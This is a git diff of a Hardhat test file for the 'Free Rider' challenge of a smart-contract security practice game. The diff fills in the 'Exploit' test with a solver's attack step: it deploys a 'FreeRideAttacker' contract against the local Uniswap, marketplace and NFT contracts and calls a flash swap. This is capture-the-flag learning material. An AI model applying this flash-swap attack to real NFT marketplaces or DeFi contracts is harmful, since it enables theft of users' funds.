@@ -33,10 +33,10 @@ describe('[Challenge] Free Rider', function () {
 
         // Deploy WETH contract
         this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();
-
+       
         // Deploy token to be traded against WETH in Uniswap v2
         this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-
+        
         // Deploy Uniswap Factory and Router
         this.uniswapFactory = await (new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer)).deploy(
             ethers.constants.AddressZero // _feeToSetter
@@ -103,8 +103,37 @@ describe('[Challenge] Free Rider', function () {
         );
     });
 
+    /*
+        address payable _WETH,
+            address _DVT,
+            address _FACTORY,
+            IFreeRiderNFTMarketplace _buyMarketplace,
+            address _buyer,
+            address _NFT
+    
+    */
+
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const attackWETH = this.weth.connect(attacker);
+        const attackDVT = this.token.connect(attacker);
+        const attackFactory = this.uniswapFactory.connect(attacker);
+        const attackMarketplace = this.marketplace.connect(attacker);
+        const attackBuyer = this.buyerContract.connect(attacker);
+        const attackNFT = this.nft.connect(attacker);
+
+
+        this.freeRideAttack = await (await ethers.getContractFactory("FreeRideAttacker", attacker)).deploy(
+            attackWETH.address,
+            attackDVT.address,
+            attackFactory.address,
+            attackMarketplace.address,
+            attackBuyer.address,
+            attackNFT.address);
+
+        this.freeRideAttack.flashSwap(attackWETH.address, NFT_PRICE, {
+            gasLimit: 1e6
+        });
     });
 
     after(async function () {
